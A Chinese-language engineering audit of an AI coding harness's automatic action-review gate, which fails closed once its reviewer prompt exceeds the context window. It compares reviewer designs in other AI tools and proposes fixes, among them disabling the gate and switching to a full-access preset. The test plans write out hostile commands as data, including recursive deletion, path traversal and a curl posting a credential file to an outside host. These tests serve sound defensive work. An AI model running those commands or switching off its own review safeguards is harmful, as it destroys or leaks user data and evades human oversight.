# DSH auto-review 长会话卡死：根因与可复用方案

- 审计日期：2026-10-29
- 审计对象：官方 DSH Desktop（安装目录 `D:\tools\deeseek-harness\`），实际宿主版本 **0.2.1-rc.3**（`resources\runtime\primary-runtime\runtime.json` 的 `desktopVersion`；用户口径 0.2.1-rc.2）、Electron 44.7.0
- 环境：Windows 11、node 24.21.0、pnpm 11.28.5、DSH_HOME=`C:\Users\kf-41\.dsh`、profile=`profiles\desktop`
- 结论口径：`[已验证]`＝有 file:line 或命令输出；`[未验证]`＝推断/未能取得直接证据
- 证据基座：`D:\work\产品类\个人产品\bot-2\audit\_extract\`（从 `app.asar` 解包的真实源码）、`_probe\`（会话日志多帧解码工具）

---

## ① 问题（可复现）

### 现象

长会话进行到中后段，**下一次工具调用**起，所有工具全部失败，会话进入不可用状态（模型还能说话，但任何工具都执行不了）。报错原文（工具结果正文，取自会话日志 `session-d39278ae-efc8-43aa-b537-160e877a7818`）：

```
Error: Auto review of tool "ops_bash" failed; its body was not executed:
auto-review: reviewer ended with error CONTEXT_WINDOW_EXCEEDED:
dsh-opencode-go/deepseek-v4.1-flash: Streaming response failed: [400]
This request would exceed the model's context window. The prompt contains at least
983041 input tokens, and you requested 65536 output tokens, resulting in a total of
1048577 tokens, which exceeds the maximum of 1048576 tokens.
```

后续同一会话内拦截点前移，变成客户端预检（不再发请求）：

```
auto-review: reviewer ended with error CONTEXT_WINDOW_EXCEEDED:
dsh-opencode-go/deepseek-v4.1-flash: pi-ai detected context overflow for model "..."
```

### 复现步骤

1. 打开 DSH Desktop，**权限预设 = `auto`**（Auto 审批预设；注意：不是"Approval policy=ask"这个开关）
2. 模型路由用 `dsh-opencode-go / deepseek-v4.1-flash`（contextWindow 1,000,000）
3. 在同一会话里把上下文堆到接近 1M token：连续几十轮工具调用、贴长文档/长日志、开 Agent Teams 让多个成员在同一会话里干活
4. 某个时刻开始，**每一次**工具调用（`ops_bash` / `ops_grep` / `write` / `web_search` / `acp_status` / `hindsight_*` 全部）都返回上面的 Error，且不会恢复；换模型/改 Approval policy 无效，只有换权限预设或新开会话能脱困

### 实证数据（本机会话日志）

- 该会话 `session.v4.jsonl.zstd`：8.98 MB（多帧 zstd，解出 24.24 MB 文本 / 8,933 事件）
- 事件直方图 top：`tool-call 5096`、`tool/call 1274`、`tool/result 1274`、`assistant/message 1179`、`step/start 1182`、`user/message 368`、`turn/start 46`、`team/task 46`、`team/member 16`、`tool-workflow/agent-start 10`
- **全日志 0 个 compaction / checkpoint / summary 事件** → 压缩一次都没跑过
- 该会话内 `CONTEXT_WINDOW_EXCEEDED` 出现 **16 次**，全部是 auto-review reviewer 失败（不是主 agent 请求失败）
- 同一会话里 reviewer 还出现过 fail-closed 的限流失败：`reviewer ended with error RATE_LIMIT: ... 429`
- **关键反差**：该会话主模型请求的 prompt 峰值只有 **238,824 token**（`assistant/message.data.usage` 的 inputTokens+cacheReadTokens，839 个样本），而 reviewer 的 prompt 是 **983,041 token** → 审批门的输入是主请求的 **4.1 倍**

---

## ② 成熟做法（外部，带出处）

| 系统 | 审批/审阅器看什么 | 超窗怎么办 | 结论 |
|---|---|---|---|
| **Anthropic Claude Code auto 模式分类器** | 只看 user 消息 + 工具调用（读数类工具如 file read/search 除外）；**tool results 被剥掉**，assistant 正文被剥掉（"reasoning-blind by design"）；每次只送"a portion of the transcript + pending action" | 分类器是独立模型调用，可配置与主模型不同的模型；连续 3 次拒绝或累计 20 次升级给人 | [官方文档](https://code.claude.com/docs/en/permission-modes.md) / [官方博客](https://www.anthropic.com/research/claude-code-auto-mode) |
| **OpenAI Codex Auto-review** | 独立 agent 打分：用户意图 + 环境 + 安全策略 + 动作影响；模型 GPT-5.4 Thinking (low) | 重复拒绝后自动停止轨迹；未公开 token 预算；**从未把 reviewer 塞进主上下文窗口预算** | [官方博客](https://alignment.openai.com/auto-review/) |
| **Cursor Agent Review** | 只审**本地 diff**（可与 main 全量对比），Quick/Deep 两档 | 审增量而非全史 → 输入天然有界 | [官方文档](https://cursor.com/docs/agent/agent-review) |
| **Claude Code compaction** | 摘要替换历史；可设 auto-compact 窗口 100K–1M（`autoCompactWindow` / `CLAUDE_CODE_AUTO_COMPACT_WINDOW`）；原始消息仍以 JSONL 留盘可 rewind | 摘要请求本身超窗 → 报 thrashing 并停止重试；提示分块读、把大文件工作移入 subagent | [官方文档](https://code.claude.com/docs/en/context-window.md)、[model-config](https://code.claude.com/docs/en/model-config.md)、[troubleshooting](https://code.claude.com/docs/en/troubleshooting.md) |
| **Anthropic context editing / compaction beta** | `clear_tool_uses`：默认 trigger 100K input tokens、保留最近 3 对 tool_use、从最老开始清；`clear_tool_inputs` 默认 false（只清结果、保留"做过什么"）。独立 compaction beta：trigger 默认 150K、生成 compaction block 后**丢弃其之前所有 message** | 服务端按预算清，不会让请求超窗 | [AWS Bedrock 官方镜像](https://docs.aws.amazon.com/bedrock/latest/userguide/model-parameters-anthropic-claude-messages-tool-use.html)、[compaction beta](https://docs.aws.eu/de_de/bedrock/latest/userguide/claude-messages-compaction.html)（platform.claude.com 正文在本机被 302 拦截，未取原文） |
| **OpenAI Codex CLI 压缩实现** | 压缩后从最新往回保留 user 消息累计 ≤20K token（`COMPACT_USER_MESSAGE_MAX_TOKENS = 20_000`），assistant 正文与 tool 结果全丢 | **压缩请求超窗不失败**：`ContextWindowExceeded` → `history.remove_first_item()` 后重试（保缓存前缀），只剩 1 条才报错 | [官方源码 compact.rs](https://cdn.jsdelivr.net/gh/openai/codex@main/codex-rs/core/src/compact.rs) |
| **Cursor dynamic context discovery** | 长工具输出写成文件而非截断；摘要后把历史当文件让 agent 回查；Skills 只留 name+description | 从源头控制 prompt 体积（A/B：调用过 MCP 的 run 总 token −46.9%） | [官方博客](https://cursor.com/en-US/blog/dynamic-context-discovery) |
| **Devin / Cognition** | memory 是持久 Git 仓库里的 Markdown，只注入 `MEMORY.md` 索引，正文按需检索；不存 session 摘要 | 历史不常驻上下文 → 天然有界 | [官方文档](https://docs.devin.ai/product-guides/memory.md)、[博客](https://cognition.com/blog/dont-build-multi-agents) |
| **subagent 隔离 / handoff** | subagent 各自 fresh context，只回 summary（描述合计 >15K token 告警，默认最多 3 层）；handoff 可用 `input_filter` 改写下一 agent 看到的历史 | 用隔离代替压缩 | [官方文档](https://code.claude.com/docs/en/subagents.md)、[OpenAI Agents SDK handoffs](https://openai.github.io/openai-agents-python/handoffs/) |

**纵向对比（公开资料现状）**：没有任何官方来源给出"reviewer 应读 N 条/X token"的定量指导；可辩护的形态只有三种——(a) 只给 user 消息 + 工具调用名与参数（Anthropic、DSH 都这么做）、(b) 独立模型 + 窄职责 + 重复拒绝即停（OpenAI）、(c) 只审 diff（Cursor）。**共同点是：审阅器的输入预算与主上下文预算是两套账，且审阅器必须有"输入太大时降级而不是拒绝"的路径。**

---

## ③ DSH 现状（file:line 证据）

### 3.1 门挂在哪、什么时候生效 `[已验证]`

`_extract\auto-review\index.js`（= asar 内 `dsh/node_modules/@deepseek-ai/dsh-experimental-auto-review/lib/index.js`，507 行，版本 0.2.1-rc.3）：

- `:461-489` `apply(ctx)` 里：`ctx.on("tools/pre-execute", async (exec, next) => {...}, { prepend: true })`
- `:463` 唯一豁免：`if (agent === void 0 || exec.parent === void 0 && exec.name === RUN_CODE_NAME) return next();`
- `:464` **开关只看权限预设**：`if (permissionPresets.current(agent.session) !== AUTO_PRESET) return next();`
  - `AUTO_PRESET = "auto"`（`_extract\dsh-permission-presets\lib\index.js:52`），`AUTO_PRESET_SPEC = { sandbox: "danger-full-access", approval: "ask" }`（`:58-62`）
  - 所以"Approval policy=ask"**不是**这个门的开关；切 `danger-full-access` 预设才彻底不挂载
- `package.json` 里 `dsh.bundle.patch` 指向 `cordis.patch.yml`，内容只有一条 `- insert: [- id: auto-review, name: '@deepseek-ai/dsh-experimental-auto-review']` → 它是 profile 级 bundle（host 平面），对该 profile 的所有会话一致生效，跟每个会话选的 agent preset（cordis/standard/minimal/ptc）无关

### 3.2 审阅请求里塞了什么 `[已验证]`

`snapshotAutoReview(agent, exec, cwd)`（`index.js:215-319`）：

- `:217-220` 数据源：`const events = session.snapshotEvents(); const nodes = [...session.surface.nodes]; const header = session.requestHeader();`
- `:253-265` 只遍历 surface 节点，`user/message` 里 `source.kind === "tool"` 的直接跳过（`:255`）；项目指令单独归 `projectInstructions`
- `:271-306` `assistant/message` 只取 tool-call 块，把**历史每次调用的工具名 + arguments 原串**放进 history（`:289-305`）；assistant 正文/reasoning **不入** history
- `:308-331` `PENDING_ACTION` = 工具 description + parameters JSON Schema + 本次 arguments；`reviewUserText()`（`:321-331`）把四段拼成**一条 user 消息**：`ENVIRONMENT / PROJECT_INSTRUCTIONS / FILTERED_HISTORY / PENDING_ACTION`，其中 `json()` = `JSON.stringify(v, null, 2)`（`:54-59`，**缩进美化**，体积只会更大）
- 官方设计笔记自述一致：`https://cdn.jsdelivr.net/gh/deepseek-ai/deepseek-harness@master/.agents/notes/implemented/feature/2026-08-28-auto-review.zh.md`（"主 agent 的 V3 system/message 节点、assistant 正文／reasoning 与 tool results 全部排除"）

### 3.3 输出预算从哪来、天花板是多少 `[已验证]`

- 审阅调用 `classifyRisk()`（`index.js:398-415`）构造：`{provider: snapshot.provider, model: snapshot.model, system: REVIEW_POLICY, messages: [一条 user 消息], temperature: 0, signal}` → `ctx.llm.stream(options)`（`:414`）
  - **没有任何 `maxTokens` / `max_output_tokens` 字段**
  - **provider/model 直接继承主 agent 的 `requestHeader()`**（`:220`、`:312-313`）→ reviewer 用的是"主模型"，本例 `dsh-opencode-go/deepseek-v4.1-flash`
- 没有 maxTokens 时落到 provider 适配器：`C:\Users\kf-41\.dsh\profiles\desktop\node_modules\dsh-opencode-go\lib\index.js:52699-52705`
  ```js
  var DEEPSEEK_V41_FLASH_DEFAULT_MAX_TOKENS = 65536;
  function requestMaxTokens(model, limits, requested) {
    const configured = limits[model.id]?.maxTokens ?? void 0;
    const allowance = configured === void 0 ? requested : Math.min(requested ?? configured, configured);
    if (model.id !== "deepseek-v4.1-flash") return allowance;
    return Math.min(allowance ?? DEEPSEEK_V41_FLASH_DEFAULT_MAX_TOKENS, model.maxTokens);
  }
  ```
  调用点 `:53003`（真正发请求的 `streamAttempt`）、`:52809`（modelInfo 给 host 预算用）
- 于是：`contextWindow 1,000,000 − 保留输出 65,536 = 983,040` 就是**实际可用输入上限**。报错里的 983,041 + 65,536 = 1,048,577 > 1,048,576 正好卡在这个边界
- 其它模型没有这个专属常量，落回 pi-ai 默认：`_extract\dsh-llm-pi-ai\lib\index.js:961` `const DEFAULT_MAX_TOKENS = 32768;`（schema 默认 `:1058`、解析 `:695`）
- 客户端预检文案：`_extract\dsh-llm-pi-ai\lib\index.js:1476` `pi-ai detected context overflow for model "${message.model}"`（mapStopReason → `CONTEXT_WINDOW_EXCEEDED`）

### 3.4 超窗之后：fail-closed，没有降级路径 `[已验证]`

- `failed()`（`index.js:447-453`）：reviewer 任何错误 → `{ kind: "deny", reason: 'Auto review of tool "X" failed; its body was not executed: ...' }`
- `:479` reviewer 判 deny 且 `ctx.approval.overrideOf() === "never"` → 直接终局拒绝；否则 `askUser()`（`:483`）
- **注意**：reviewer *报错* 走的是 `failed()`→deny，**不是**"转人工审批"；所以长会话里用户看到的是每次工具调用直接失败，而不是审批弹窗
- 官方设计笔记明确写了这是**故意**的："超窗请求直接拒绝，不做摘要、截断、额外 compaction 或设置小型输出 token 预算。"

### 3.5 为什么"上下文压缩"救不了它 `[已验证]`

- 压缩的后端是 `dsh-compaction-basic`，它按 **`ctx.tokenMeter` 的请求压力**触发（`_extract\dsh-compaction-basic\lib\index.js:793` 注释 "Dependency-light compaction backend using `ctx.tokenMeter` for pressure"），阈值（`:124-145`）：
  ```
  messageBudgetTokens = contextWindow − reservedCompletionTokens
  pressureBudgetTokens = messageBudgetTokens − headroomTokens(默认 65536)
  thresholdTokens = floor(min(contextWindow × thresholdRatio(默认 0.8), pressureBudgetTokens))
  ```
  1M 窗口 + 65,536 输出预留 → 阈值 ≈ **800,000 token**（以**主请求**的测量为准）
- 该失败会话 8,933 事件里 **0 个 compaction 事件**，主请求峰值仅 238,824 token → 远低于 800K，压缩"认为没事"
- 而审批门的输入是另一套账：**surface 的 user 文本 + 全部工具调用 arguments**（美化 JSON），实测 983,041 token
- 机制本质：`session.deriveMessages()`（`_extract\dsh-session\lib\index.js:1672-1700`）与门的 `snapshotAutoReview` 都以 `session.surface.nodes` 为源，但**门的渲染方式（历史全部工具参数 + 缩进美化 + 不共享主请求的任何裁剪/投影）与主请求不同**；再加上压缩只认主请求压力 → **两套账不会互相发现，门先炸**
- 补充事实：`_extract\dsh-web-app\cordis.patch.yml:544` 把 host 平面的 `compaction-basic` 关掉、改由每个会话的 agent preset 挂载（`_extract\web-app-presets\cordis.patch.yml:65-78`、`standard.patch.yml:66-78`、`ptc.patch.yml:66-78`、`minimal.patch.yml:24-31` 均含 `compaction` group）→ 压缩能力本身存在，只是触发条件与门无关

### 3.6 门没有任何可调参数 `[已验证]`

- `auto-review/package.json` 只有 `main`/`exports`/`dsh.bundle.patch`，**没有 Config schema**
- `index.js` 全文 grep `Config|Schemastery|ctx.config|maxTokens|budget` → **零命中**
- 所以：门只能"开/关"，不能调输入量、不能调输出预算、不能换成便宜模型。`[已验证]`

### 3.7 另一条独立死法（同源，容易混淆） `[已验证]`

`nativeAction()`（`index.js:183-185`）：`if (candidate === void 0 || schemas.length !== 1) throw new Error("auto-review: the pending native tool schema is missing or ambiguous")` —— 本轮 request header 的工具表里找不到该工具（或同名重复）时报这个，表现为"某个工具突然永久不可用"。实测历史会话里出现过（`team_task_create` 连续失败，最后改 `send_message` 派工）。

---

## ④ 我们能不能复用（四档判定）

| 档位 | 能做什么 | 改动文件 | 谁受益 | 随 DSH 升级是否保留 | 风险 |
|---|---|---|---|---|---|
| **A. 配置（保门，抬天花板）** | 给 `deepseek-v4.1-flash` 设 `modelLimits.maxTokens: 8192` → reviewer 与主请求的 `max_tokens` 都变 8192 → 输入上限从 983,040 抬到 **1,040,384** | `C:\Users\kf-41\.dsh\profiles\desktop\cordis.patch.yml`（现有 `- id: opencode-go` 块内加 `modelLimits`） | 该 profile 的**所有会话、所有后续任务** | **保留**（profile 属用户侧，桌面升级不覆盖；实测 rc.2→rc.3 升级后 profile 内容未丢） | 主 agent 单次输出也被压到 8192；只是把墙往后挪，不是根治 |
| **A′. 配置（关掉审批门）** | profile patch 加 `- id: auto-review` + `disabled: true`（或从 `package.json` 的 `dsh.profile.bundles` 删掉 `@deepseek-ai/dsh-experimental-auto-review`） | 同上 / `profiles\desktop\package.json` | 同上，全 profile | **保留** | 完全失去自动审阅（只剩 sandbox 与 approval）。⚠️ 若靠 patch 关掉但预设仍是 `auto`（approval=ask），每次调用会变成人工审批 → 本环境审批被自动拒绝 = 同样不可用；必须配合把预设切 `danger-full-access` |
| **B. 插件（替换门，保住保护）** | ① 关掉官方门；② 自研 host 插件 `dsh-bounded-review`：`tools/pre-execute` 上游插入，**输入预算硬上限**（例如 8–16K chars：最近 N 次工具调用 + 当前动作 + cwd + 规则库），走**便宜模型**（`bigmodel/glm-5.3-flash`，`maxTokens: 256`，3s 超时），任何失败/超时 → **规则兜底**（不 fail-closed） | 新插件包放进 `profiles\desktop`（dependencies + `dsh.profile.bundles`）+ profile patch 关闭官方门 | 全 profile 所有后续任务 | **保留**（插件在 profile 里，重装应用不丢；需自己跟版本） | 自研维护成本；规则要能挡住危险动作；插件 API 随 DSH 大版本可能变 |
| **C. 自建（自家 agent 层）** | 在我们自己的执行器（bot-team/JuJing runner）里做有界执行器：状态落盘、每次只带最近 N 步、审批用规则+diff；或干脆在自家层禁用 DSH 的 auto 预设 | 自家代码（**本次不动**） | **只惠及自家产品**，不修 DSH 会话 | 不受 DSH 升级影响 | 对"D:"盘其它 DSH 使用场景无帮助 |
| **D. 用法（0 改动）** | 长任务一任务一会话；大文件先落盘给路径不要贴正文；重活交 subagent（各自独立 context）；预告 800K 前主动开新会话；临时脱困：权限预设切 `danger-full-access` | 无 | 立刻生效，但依赖人/agent 纪律 | 永久 | 靠自觉，容易再踩 |

**技术可行性依据（为什么 B 能做）**：
- `tools/pre-execute` 是 waterfall，handler 可直接返回 `{ kind: "deny", reason }` 短路：`C:\Users\kf-41\.dsh\profiles\desktop\node_modules\dsh-ops\lib\index.js:76-79`（第三方 host 插件实证）
- 另有单调 guard 只能 deny、不能 force-allow：`_extract\dsh-tools\lib\index.js:3008-3016`、pre-execute 调用点 `:3321` → **不能靠"后挂插件抢跑"绕过官方门，必须先禁用官方门** `[已验证]`
- `@michengai/dsh-skills-manager` 也注册 `tools/pre-execute`，说明该水位已被多个第三方插件稳定使用

---

## ⑤ 推荐组合与顺序

**第 0 步（现在就能脱困，0 改动）**：把当前会话的权限预设从 `auto` 切到 `danger-full-access`。门只在 `auto` 下挂载（`index.js:464`），切走即恢复。代价：本轮失去自动审阅。

**第 1 步（配置，10 分钟，保留审阅）——方案 A**
在 `C:\Users\kf-41\.dsh\profiles\desktop\cordis.patch.yml` 现有 `- id: opencode-go` 块内追加：

```yaml
    modelLimits:
      deepseek-v4.1-flash:
        maxTokens: 8192
```

- 生效条件：**重启 DSH Desktop**（profile 配置在进程启动时 compose；2026-10-28 装 dshmarket 时已验证过"必须重启"）
- 效果：reviewer 与主请求 `max_tokens` = 8192 → 输入上限 1,040,384（原 983,040）
- 回滚：删掉这三行 `modelLimits` + 重启
- **负测试（必做）**：① 正常读操作必须 allow（`ops_bash: echo hi`）；② 高危动作必须仍被 deny —— 构造一条明显越界的调用（例如 `ops_bash: cmd /c echo > C:\Windows\test-acl.txt` 或对工作区外路径 `Remove-Item -Recurse`）→ 必须看到 `Auto review rejected / denied`，而不是"直接执行了"
- 升级影响：profile 属用户侧，升级保留

**第 2 步（根治，半天）——方案 B**
1. 关官方门：profile patch 追加
   ```yaml
   - id: auto-review
     disabled: true
   ```
2. 自研 `dsh-bounded-review`（host 插件，`cordis.patch.yml` 里 `- insert`），核心约束：
   - 输入上限硬编码（默认 12,000 chars）：`最近 6 次工具调用（名字+参数，截断到 800 chars/条）` + `当前动作完整参数（上限 4,000 chars）` + `cwd` + `规则命中摘要`
   - 模型：`bigmodel/glm-5.3-flash`（contextWindow 1M、`maxTokens: 256`、`temperature: 0`、3s 超时）；**任何异常 → 走规则，不再 fail-closed**
   - 规则 deny 清单：`rm -rf`/`del /f /s`/`Remove-Item -Recurse` 指向系统盘、工作区外写入、路径穿越（`..\` 出 workspace）、外发网络（`curl/wget/Invoke-WebRequest` 非白名单域）、读凭据（`.dsh` 下 token、`env` 全量导出）、`git push --force`
   - **负测试三件套（必须全绿才算完成）**：① `rm -rf C:\Users\kf-41\Desktop\__autoreview_test` → deny；② `ops_bash: echo pwn > ../../etc/x`（路径穿越）→ deny；③ `ops_bash: curl -s https://example.com -d @C:\Users\kf-41\.dsh\settings.yaml` → deny；④ 对照组 `ops_bash: ls` → allow
3. 只惠及本 profile 的所有后续任务；升级保留

**第 3 步（可选）——方案 D 写进团队规范**：一任务一会话、长输出落盘、重活交 subagent。

**不建议**：把 `maxTokens` 调低到 32768 以下作为唯一手段——它只抬 30K token 的天花板，且已实测会让报错前移成客户端预检（`pi-ai detected context overflow`），治标不治本。

---

## ⑥ 未验证项清单

1. **为什么门输入是主请求的 4.1 倍**：同一会话门输入 983,041 vs 主请求峰值 238,824（`assistant/message.data.usage`，839 样本）。候选解释（未验证，按可信度排序）：① `json()` 缩进美化 + 历史每次调用的完整 arguments 原串而主请求侧有其它裁剪/投影；② 该会话是 Agent Teams 会话（`team/task 46`、`team/member 16`、`tool-workflow/agent-start 10`），多人/多成员事件进同一 session surface，门按整份 surface 组装而单个 agent 请求只带自己的分支。**影响**：只影响"为什么 4 倍"的定量解释，不影响 ③④⑤ 的结论与补丁（补丁按"门输入随 surface 单调增长、无预算"设计即可）。
2. `session.surface.nodes` 在 Agent Teams 下是否被多个成员共享、单成员请求是否按分支过滤：未能在 `dsh-session`/`dsh-agent-loop` 打包体里找到分支过滤的确切代码位置（`deriveMessages()` 见 `_extract\dsh-session\lib\index.js:1672-1700`，按整个 surface 派生）。
3. compaction 的 `ctx.tokenMeter` 具体读数来源（是 provider usage 还是本地估算）：只读到注释 "using `ctx.tokenMeter` for pressure"（`_extract\dsh-compaction-basic\lib\index.js:793`），未追进 token-meter 实现。
4. `ctx.approval.overrideOf()` 与 UI 上"Approval policy"的映射：只在会话日志里看到 `permission/preset` 与 approval 同步切换（当前会话 preset 序列 `workspace-write(0) → auto(1744) → danger-full-access(2051) → auto(2563) → …`），未逐键核对 UI 文案。
5. 官方 DSH 后续版本是否已修（当前 0.2.1-rc.3 仍是 fail-closed，官方笔记明确是设计选择）；社区分支 `hyudryu/Deepseek-Harness-Customized` 修的是**压缩自身超窗**（"auxiliary call built from the very prefix that had just overflowed"），不是审批门。
6. Anthropic context-editing / memory tool 的原文：platform.claude.com / docs.anthropic.com 在本机被 302 拦截，参数与默认值取自 AWS Bedrock 官方镜像，未与原文逐字比对。
7. Claude Code 默认 auto-compact 阈值的官方百分比未取到（文档抓取在 ~50KB 处截断）；只拿到 Haiku 5.5 的 ~967K 个例与 100K–1M 可配范围，网传 95% 无官方出处。
8. Codex 官方人类可读文档（auto-review/compaction 说明）本机 403；第 ② 节 Codex 部分仅基于官方源码 `compact.rs`。
9. "未找到 reviewer 预算的公开定量指导"这一结论**只覆盖可读搜索结果与笔记**，不是穷举（GitHub 全文搜索 API 需认证，HTML 正文被截断）。

---

## 附：可复用工具

| 工具 | 用途 |
|---|---|
| `_probe\zstd-frames.js` | DSH 会话是多帧拼接 zstd（单帧解压只得首帧 281 字节），此脚本按 frame 头逐帧解 |
| `_probe\dump.js` | `node dump.js <session.v4.jsonl.zstd> <out.txt>` 解成 JSONL（⚠️Git Bash 的 `/tmp` 与 node 看到的 `D:\tmp` 不是同一个地方，跨工具传路径要写全 Windows 路径） |
| `_probe\session-stats2.js` | 统计事件直方图 / REVIEWABLE token 估算 / preset 序列 |
| `asar-tool\extract-one.js`、`extract-presets.js` | 从 `D:\tools\deeseek-harness\resources\app.asar` 按包名解出 lib/src/presets（asar 路径用反斜杠、无前导 `\`；`@electron/asar` 的 `extractFile` 需相对路径） |
| 会话目录 | `C:\Users\kf-41\.dsh\sessions\<workspace编码>\<sessionId>\session.v4.jsonl.zstd` |

---

## ⑦ 社区实践：别人到底是怎么解决的（2026-10-29 调研）

> 用户原问（m02173）：「我需要知道使用 dsh 的这么多人是如何解决这个肯定会遇到的问题」。
> 结论先说：**这个问题在社区不是"热点难题"，而是"少数人踩到、多数人绕开"的问题**；真正被广泛治理的是它的上游原因——上下文从来不被压缩。

### 7.1 为什么看起来"没人讨论"：官方把它定义成非默认选项 + 文档化限制

| 证据 | 原文 | 含义 |
|---|---|---|
| `dsh-permission-presets/README.zh.md`「已知限制」[已验证] | "**Auto 不能成为默认值**：它只在 integration effect 存活期间存在，并且有意不进入 `permission` 设置 schema。" | Auto 是每会话手动开的实验选项；绝大多数用户的默认会话里根本没有这道门 |
| `dsh-experimental-auto-review/README.zh.md`「Token 影响」[已验证] | "每个受支持调用额外产生一次模型请求，**不缓存、重试、截断、压缩，也不设单独的小型输出预算。超窗请求以 provider 错误使调用失败**" | 官方把它写成已知设计，不是待修 bug；指望官方"把门做成 O(1)"不现实 |
| 官方仓库 Discussions 检索 [已验证，REST 搜索] | `auto-review` / `CONTEXT_WINDOW_EXCEEDED` / "自动审查" 在 issue 检索命中 **0** | 该仓库用 Discussions 做渠道，issue 检索无效；也侧面说明没有集中的"官方修"议程 |

### 7.2 量化：社区把力气花在哪

**插件市场全量**（`C:\Users\kf-41\.dsh\marketplace\list-cache\dsh.json`，11,295 个仓库，generated 2026-10-29T07:35Z）[已验证]：

| 关键词 | 命中仓库数 | 占比 |
|---|---|---|
| auto-review / 自动审查 | 11 | 0.10% |
| 审批 / permission / approval | 241 | 2.1% |
| 上下文 / context / compact | 428 | 3.8% |

**npm 近 30 天下载**（2026-09-28～2026-10-27，`api.npmjs.org`）[已验证]：

| 包 | 30 天下载 | 定位 |
|---|---|---|
| `billion-context` | **2,223,244** | 上下文压缩/治理（我们已装） |
| `dsh-context` | 220,323 | 上下文面板/`/context`（官方员工 @tianyicui 推荐） |
| `@michengai/dsh-skills-manager` | 138,355 | 技能管理 |
| `dsh-session-manager` | 15,667 | 会话管理 + **压缩阈值可调** |
| `dsh-client-auto-continue` | 10,823 | 报错后自动"继续" |
| `dsh-auto-review`（替代门） | 7,077 | 有界上下文的第二模型审批 |
| `dsh-permission-rules` | 6,453 | 声明式规则审批（不调模型） |
| `@mrweicodes/dsh-permgate` | 2,571 | 审批门 |
| `@nanmicoder/dsh-auto-mode` | 2,179 | 旧自动审批（已停维护） |
| `dsh-auto-approval` | 897 | 自动审批 |

→ 上下文治理的量级是"替代审批门"的 **300 倍以上**。社区共识是：**先把上下文管住，而不是把审批门换掉**。

### 7.3 三类真实做法（各自有人在做，有链接有安装行）

**A. 上下文治理派（主流）**
- `dream12347/dsh-session-manager`（npm `dsh-session-manager`）：**可把压缩阈值设为窗口的 17%–90%，对所有 agent preset 统一生效、重启仍生效**；另有 fork / 回收站 / 统计。这是对"压缩永不触发"最直接的用户侧旋钮。[已验证 README]
- `bowenliang123/dsh-context`（1072★）：Context 面板 / `/context` / Insights，看上下文由什么组成、趋势如何——先能看见，才能管。[已验证 README]
- 中文社区 FAQ #719（源自 discussion #6671）给出同型诊断与建议：「每次请求输出预留 maxTokens=256000，有效输入上限仅 792576，按 window 计算的 0.8 阈值永远无法触发压缩」；**社区方案：暂无明确方案**；建议「调低 `thresholdRatio` 或减小输出预留 `maxTokens`，并及时手动压缩」<https://dsh-ai.com/faq/719/> [已验证页面]
- **补上"为什么压缩不触发"的根因**：discussion #10153「tokenMeter under-prices CJK text by ~2.3x: the chars/4 heuristic is script-blind」——内置 token 计量用固定 `chars/4` 启发式，**中文会话被系统性低估约 2.3 倍**，于是"看起来才 300K"其实已经 700K，压缩阈值永远够不着 <https://github.com/deepseek-ai/deepseek-harness/discussions/10153> [已验证标题与摘要；正文 JS 渲染未逐字取到]
- 同类：FAQ #699（#6672）「超上下文后无 compaction，会话卡死」；#10059「compaction checkpoint 每折都涨直到 summary 撞 maxTokens」<https://github.com/deepseek-ai/deepseek-harness/discussions/10059>；#7423/#9814「小窗口路由下压缩请求自身超窗，形成自锁」。

**B. 替代审批门派（真要自动审批的人）**
- `PerryLink/dsh-auto-review`（112★，作者在官方 Discussions #10313 发布 <https://github.com/deepseek-ai/deepseek-harness/discussions/10313>）：**核心差异就是有界输入** —— `contextBudget: {turns: 2, maxChars: 4000}`，只喂"本轮 + 上一轮"的紧凑转录；`maxReviewsPerTurn/maxFailuresPerTurn: 10`、断路器（连续 3 拒或 10 中 6 拒）、`verdictCacheTtlMs: 60000`；`fallbackPolicy` 默认 `rejected`（fail-closed，可选 delegate / allow-once）；挂的是**官方 `approval/request` answerer 链**，只认领 ai-policy 请求，其余 `next()` 交人工，不短路人工审批；还可选本地 150M 非生成式模型 `reviewerBackend: phocinae`（无 API key、无外网、GPU ~21ms）。
- `PerryLink/dsh-permission-rules`（52★）：Claude Code 风格有序 allow/deny/ask 规则 + 内置高危基线，**不调用模型**；`ask` 交给官方审批 seam，可与上一个组合成"规则判已知 + 模型判未知"。
- `SeverusZh/dsh-yolo-mode`：LLM 裁决 `escalate sandbox to ...` 升权申请，presets off/strict/balanced/permissive/yolo，fail-closed + JSONL 审计；README 自承与官方 Auto 重叠、可能停维护。
- 官方 Auto 出现前的老方案 `NanmiCoder/dsh-auto-mode`（131★）**已于 2026-09-29 归档**，理由写明"DeepSeek Harness now includes built-in Auto review"；迁移要求先切回内置手动模式（如 workspace-write）再卸载。
- 社区还有人做了「按症状索引 11 个防护插件，各附装机命令」的清单（discussion #10751 <https://github.com/deepseek-ai/deepseek-harness/discussions/10751>）[已验证标题与摘要] —— 说明这已经是一个"插件补齐官方缺口"的生态位。

**C. 坚持用官方 Auto 的人（踩的是另一批坑，不是"门读全量"）**
- **opencode-go 路由**：OpenCode Go 自 2026-09-05 要求每请求带 `x-opencode-session`，而 **auto-review 的 reviewer 调用不带 sessionId** → 直接报 `Auto review of tool "..." failed`。社区解法是传输层补头插件 `dsh-opencode-go-x-session`（作者 README 明确"可以用于解决现 deepseek harness 实验性功能自动审查使用 opencodego 导致的不可用问题"）<https://github.com/pengpenglele/dsh-opencode-go-x-session-code> [已验证 README]。
- **依赖死锁**：discussion #10040「运行时重载导致权限选择器消失与工具永久失效：permission-presets 与 auto 预设的依赖死锁（0.2.1-rc.2 仍复现）」——**社区无方案**，只能不在会话中重载插件、出问题重启 host <https://dsh-ai.com/faq/1108/>；同家族 #10007「回合中改模型/权限后工具全失效」<https://dsh-ai.com/faq/1110/>。
- **撞墙后的止损**：FAQ #1036（#9544）「会话超模型窗口后每轮 400 永久报废」；对策只有开新会话 / 手动 `/compact` / 用 `dsh-auto-continue` 自动重发被中断的请求。

### 7.4 横向对照：我们的现场落在哪一格

| 我们的现象 | 社区对应条目 | 社区是否已有解法 |
|---|---|---|
| 门输入 983K，主请求峰值仅 238K | 无人直接报告"门输入是主请求 4 倍"；官方文档只承认"超窗即失败" | ❌ 无（所以我们这份取证是新的） |
| 12.7MB 会话 **0 次 compaction** | #10153 CJK 低估 2.3x + FAQ #719 输出预留吃掉窗口 | ⭕ 有（调阈值/换计量/减小输出预留/手动压缩） |
| 所有工具全被同一原因拦 | #10040 依赖死锁（另一条路径） | ❌ 无 |
| 压缩了也不减门输入 | —— | ❌ 无 |
